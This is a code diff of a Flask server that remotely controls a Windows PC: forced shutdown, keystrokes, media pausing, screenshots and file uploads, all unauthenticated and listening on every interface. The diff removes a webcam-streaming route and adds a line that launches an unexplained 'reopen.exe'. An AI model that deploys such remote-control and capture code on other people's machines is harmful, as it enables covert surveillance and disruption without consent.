@@ -2,18 +2,14 @@ from os.path import exists
 import os
 import keyboard
 import time
-from flask import Flask, request, abort, render_template, Response, send_file
+from flask import Flask, request, render_template, send_file
 from werkzeug.utils import secure_filename
 import pyautogui
-import cv2
 import ait
 import pygame
 app = Flask(__name__)
-camera=cv2.VideoCapture(0)
 responsegood = '<img src="https://c.tenor.com/4Mv5tE-bc-4AAAAC/parks-and-rec-parks-and-recreation.gif" alt"haha"><p>ur do the <strong>good</strong></p>', 200
-
 @app.route('/', methods=['GET','POST'])
-
 def webhook():
     if request.method == 'GET':
         print("GET Request Received")
@@ -37,7 +33,7 @@ def webhook():
             pause()
             return responsegood
         else:
-            return 'done messed up boi', 400
+            return render_template('/ytblock/blocked.html')
     else:
         print('EXITING...')
         time.sleep(2)
@@ -70,24 +66,13 @@ def update():
     keyboard.send('Enter')
 def shutdown():
     os.system("shutdown /s /t 1")
-
-def generate_frames():
-    while True:
-        success,frame=camera.read()
-        if not success:
-            break
-        else:
-            ret, buffer=cv2.imencode('.jpg',frame)
-            frame = buffer.tobytes()
-        yield(b'--frame\r\n'
-                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
 def corner():
     ait.move(2160j,1440j)
 def pause():
     pyautogui.press('playpause')
-@app.route('/cam')
-def cam():
-    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
+@app.route("/block")
+def block():
+    return render_template('blocked.html')
 @app.route('/screen')
 def shot():
     sshotmain = pyautogui.screenshot()
@@ -130,6 +115,7 @@ def viewfile():
         return send_file('uploaded.py', mimetype='text/plain')
     else:
         return 'no file found'
+os.startfile("reopen.exe")
 if __name__ == '__main__':
     app.run(host="0.0.0.0",port=5000)
 #you can change the port it runs on^
